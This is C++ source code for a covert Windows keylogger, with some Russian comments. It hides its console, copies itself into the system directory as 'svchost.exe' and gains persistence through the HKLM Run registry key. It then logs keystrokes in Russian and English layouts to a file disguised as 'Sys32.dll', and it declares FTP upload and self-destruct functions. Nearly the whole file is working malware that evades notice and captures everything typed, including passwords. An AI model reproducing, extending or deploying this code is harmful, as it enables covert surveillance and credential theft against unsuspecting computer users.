//Cutting out
#pragma comment(linker,"/merge:.rdata=.data")
#pragma comment(linker,"/merge:.text=.data")
#pragma comment(linker,"/entry:WinMain")
#pragma comment(linker,"/NODEFAULTLIB:libcmt.lib")
#pragma comment(linker,"/MERGE:.rdata=.text")
//Library...................................................
#pragma comment(lib,"wininet.lib")
#include "interceptor.h"
#include "command.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
typedef DWORD (WINAPI *REGSERVPROC)(DWORD, DWORD);
using namespace std;
char szSystemExe[256];
char szFlashExe[256];
char szSystemLog[256];
char szFlashLog[256];
char s[10];
//...................................................Library

//Declaring functions.......................................
void exterminate();
void hide_the_console();
void getting_the_file_path();
void up_in_the_system();
void registration_in_the_registry();
int start(void);
char* interceptorEng(void);
char* interceptorRus(void);
void upload(LPCSTR filename,LPCSTR ftpfilename);


//........................................Declaring function


//The entry point into the program...........................
int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int)
{ 
exterminate(); //Функция самоуничтожения
hide_the_console(); //Спрятать консоль
getting_the_file_path(); //Получение имен файлов
up_in_the_system(); //Копирование в системную деррикторию
registration_in_the_registry(); //Регистрация в системном регистре
start(); //Начало программы


return 0;}
//.........................The entry point into the program

// A description of all functions used
void hide_the_console() // Makes a hidden console
{
HWND stealth; 
AllocConsole();
stealth=FindWindowA("ConsoleWindowClass",NULL);
ShowWindow(stealth,0);
}

void getting_the_file_path() // There is ways to assign a name to the global variables
{
char buffer[256];
	DWORD size;
	size=sizeof(buffer);
	GetComputerNameA(buffer,&size);
GetSystemDirectory(szSystemExe,256); 
strcat(szSystemExe,"\\Setup\\svchost.exe");    
GetModuleFileName(GetModuleHandle(NULL),szFlashExe,256);
strcat(szSystemLog,"C:\\WINDOWS\\AppPatch\\");
strcat(szSystemLog,buffer);
strcat(szSystemLog,"Sys32.dll");
strcpy(szFlashLog,"vbv.txt");
}


void up_in_the_system() // Copy the file to the System folder
{
CopyFile(szFlashExe,szSystemExe,false);
CopyFile(szSystemLog,szFlashLog,true);

}

void registration_in_the_registry()
{
HKEY hk;
RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hk);
RegSetValueEx(hk,"Service",0,REG_SZ,(LPBYTE)szSystemExe, strlen(szSystemExe) + 1);
RegCloseKey(hk);
}

int start(void)
{
char conststr[10];
char szBuf[10];
FILE *f;
if ((f=fopen(szSystemLog,"at"))==NULL)
f=fopen(szSystemLog,"wt");
fclose(f);
while(true){

if(LOWORD((DWORD)GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)))==1049) strcpy(szBuf,interceptorRus());
if(LOWORD((DWORD)GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)))==1033) strcpy(szBuf,interceptorEng());
	if ( (strcmp(szBuf,"nothing")!=0) && (strcmp(szBuf,conststr)!=0) )
        	{
		f=fopen(szSystemLog,"at");
                fwrite(szBuf,strlen(szBuf),1,f);
		fclose(f);
        	}
	strcpy(conststr,szBuf); //make previos
            }
return 0;}



